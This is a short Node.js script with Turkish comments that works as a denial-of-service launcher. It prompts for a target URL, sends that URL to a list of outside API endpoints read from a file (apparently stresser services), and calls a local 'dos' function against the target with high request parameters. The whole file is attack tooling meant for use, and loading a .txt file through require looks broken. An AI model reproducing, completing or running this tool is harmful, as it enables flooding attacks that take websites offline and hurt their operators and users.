const readline = require('readline');
const fetch = require('node-fetch');
const dos = require('./bin');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

rl.question('URL girin: ', (url) => {
  // API'ye gönderilecek olan URL'lerin bulunduğu dosya
  const apiDosyasi = './api.txt';

  // Dosyadaki API'leri oku
  const okunanApilar = require(apiDosyasi);

  // API'leri sırayla döngü ile işle
  okunanApilar.forEach((api, index) => {
    // API'ye URL'yi gönder
    fetch(`${api}?url=${url}`)
      .then(response => response.text())
      .then(data => {
        console.log(`API ${index + 1} Yanıtı:`, data);
        
        // Ardından dos fonksiyonunu kullan
        dos(url, 10000, 10000);

        // Eğer son API'ye ulaşıldıysa kapat
        if (index === okunanApilar.length - 1) {
          rl.close();
        }
      })
      .catch(error => console.error(`API ${index + 1} Hatası:`, error));
  });
});
